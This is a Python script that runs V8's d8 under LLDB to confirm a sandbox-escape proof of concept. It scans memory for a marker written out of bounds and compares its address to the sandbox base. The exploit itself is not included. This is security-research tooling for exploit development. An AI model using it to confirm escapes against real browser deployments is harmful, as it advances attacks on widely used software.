#!/usr/bin/env python3
"""
LLDB Python script: confirm H < SB_BASE for V8 sandbox escape PoC.

What it does:
  1. Run d8 under LLDB with the PoC
  2. PoC prints SB_BASE and pauses at %SystemBreak()
  3. At the pause, search memory for 0xC0DECAFE (value written via OOB)
  4. The address where it's found = H + found_offset (= H + 0x1000)
  5. Compare to SB_BASE — if below, H is native heap outside sandbox VA

Run:
  python3 lldb_verify.py
"""

import subprocess, re, sys, struct

D8  = '/tmp/d8_build_mca/d8'
JS  = '/home/user/v8/heap_escape_lldb.js'
FLAGS = ['--sandbox-testing', '--allow-natives-syntax']

# LLDB commands to run after %SystemBreak() fires (SIGTRAP)
# We search for 0xC0DECAFE (little-endian: FE CA DE C0) in process memory.
# LLDB memory find: -e (expression) takes hex bytes in search order;
# for LE uint32 0xC0DECAFE the bytes are FE CA DE C0.
LLDB_CMDS = r"""
run
process handle SIGTRAP --stop true --pass false --notify true
continue
# now stopped at SystemBreak — search for OOB-written marker
memory find --size 4 --expression '\xfe\xca\xde\xc0' -- 0x0 0x7fffffffffff
process kill
quit
""".strip().splitlines()

def main():
    cmd_args = ['-o ' + c for c in LLDB_CMDS if c.strip() and not c.startswith('#')]
    # Build flat LLDB batch command
    lldb_cmd = ['lldb', '--batch']
    for c in LLDB_CMDS:
        c = c.strip()
        if not c or c.startswith('#'):
            continue
        lldb_cmd += ['-o', c]
    lldb_cmd += ['--', D8] + FLAGS + [JS]

    print('[*] Running:', ' '.join(lldb_cmd[:6]), '...')
    result = subprocess.run(lldb_cmd, capture_output=True, text=True, timeout=30)
    output = result.stdout + result.stderr
    print(output)

    # Parse SB_BASE from PoC output
    sb_match = re.search(r'SB_BASE\s*=\s*(0x[0-9a-fA-F]+)', output)
    # Parse the address LLDB found for the marker
    # LLDB memory find output: "data found at location: 0xXXXXXXXXXXXX"
    found_match = re.search(r'data found at location:\s*(0x[0-9a-fA-F]+)', output)

    if not sb_match:
        print('[!] Could not parse SB_BASE from output')
        return
    sb_base = int(sb_match.group(1), 16)
    print(f'\n[+] SB_BASE       = {hex(sb_base)}')

    if not found_match:
        print('[!] 0xC0DECAFE not found in memory search')
        print('    (May need to adjust search range or marker)')
        return

    marker_addr = int(found_match.group(1), 16)
    # marker_addr = H + found_offset (= H + 0x1000 based on PoC output)
    # H = marker_addr - 0x1000
    H = marker_addr - 0x1000
    print(f'[+] Marker found  = {hex(marker_addr)}  (= H + 0x1000)')
    print(f'[+] H (ab_victim) = {hex(H)}')
    print(f'[+] SB_BASE       = {hex(sb_base)}')
    print()

    if H < sb_base:
        delta = sb_base - H
        print(f'[✓] H < SB_BASE  →  H is {delta // 1024} KB below SB_BASE')
        print('[✓] CONFIRMED: backing store is native heap OUTSIDE sandbox VA')
        print('[✓] OOB write target (H+0x1000) is also outside [SB_BASE, SB_END)')
        print('[✓] SANDBOX ESCAPE VERIFIED BY LLDB')
    else:
        delta = H - sb_base
        print(f'[✗] H >= SB_BASE  →  H is {delta // 1024} KB INSIDE sandbox VA')
        print('[✗] Write target is in-sandbox — not a sandbox escape')

if __name__ == '__main__':
    main()
